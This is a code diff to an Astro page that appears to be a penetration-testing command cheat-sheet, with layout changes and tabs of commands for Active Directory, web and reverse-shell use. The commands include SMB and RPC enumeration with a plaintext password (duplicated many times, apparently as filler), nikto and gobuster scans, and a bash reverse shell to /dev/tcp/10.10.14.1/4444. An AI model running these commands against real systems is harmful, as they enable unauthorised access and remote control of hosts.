@@ -14,9 +14,11 @@ import TabButton from "../components/TabButton.astro";
 	</head>
 	<body class="bg-gray-100 font-sans">
 		<Layout>
-			<main class="min-h-screen bg-black text-white font-mono p-4">
+			<main
+				class="h-screen bg-gray-950 text-white font-mono p-4 overflow-hidden"
+			>
 				<div
-					class="max-w-screen-lg mx-auto border-2 border-white p-4 rounded-xl"
+					class="h-full max-w-screen-lg mx-auto border-2 border-white p-4 rounded-xl flex flex-col"
 				>
 					<div
 						class="flex justify-between items-center mb-4 border-b border-white pb-2"
@@ -40,7 +42,9 @@ import TabButton from "../components/TabButton.astro";
 						</nav>
 					</div>
 
-					<div class="grid grid-cols-3 gap-4">
+					<div
+						class="grid grid-cols-3 gap-4 flex-grow overflow-hidden"
+					>
 						<!-- Left Form Inputs -->
 						<div class="space-y-4">
 							<InputBox label="IP" />
@@ -51,9 +55,9 @@ import TabButton from "../components/TabButton.astro";
 						</div>
 
 						<!-- Command Section -->
-						<div class="col-span-2 space-y-4">
+						<div class="col-span-2 flex flex-col overflow-hidden">
 							<div
-								class="flex space-x-2 border-b border-white pb-2"
+								class="flex space-x-2 border-b border-white pb-2 mb-2"
 							>
 								<button
 									class="tab-btn px-4 py-1 border border-white rounded-md bg-white text-black"
@@ -69,16 +73,147 @@ import TabButton from "../components/TabButton.astro";
 								>
 							</div>
 
-							<div id="tab-content" class="space-y-2">
-								<div data-tab-content="ad">
+							<div
+								id="tab-content"
+								class="space-y-2 flex-grow overflow-y-auto pr-2"
+							>
+								<div data-tab-content="ad" class="space-y-2">
 									<CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
+										command="smbclient -L //10.10.11.31 -U e.rodriguez"
+									/>
+									<CommandBox
+										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
+									/><CommandBox
 										command="smbclient -L //10.10.11.31 -U e.rodriguez"
 									/>
 									<CommandBox
 										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
 									/>
 								</div>
-								<div data-tab-content="web" class="hidden">
+								<div
+									data-tab-content="web"
+									class="hidden space-y-2"
+								>
 									<CommandBox
 										command="nikto -h http://10.10.11.31"
 									/>
@@ -86,7 +221,10 @@ import TabButton from "../components/TabButton.astro";
 										command="gobuster dir -u http://10.10.11.31 -w /usr/share/wordlists/dirb/common.txt"
 									/>
 								</div>
-								<div data-tab-content="revshell" class="hidden">
+								<div
+									data-tab-content="revshell"
+									class="hidden space-y-2"
+								>
 									<CommandBox
 										command="bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
 									/>
@@ -133,7 +271,6 @@ import TabButton from "../components/TabButton.astro";
 								const span =
 									button.parentElement?.querySelector("span");
 								if (!span) return;
-
 								const command = span.textContent;
 								if (!command) return;
 
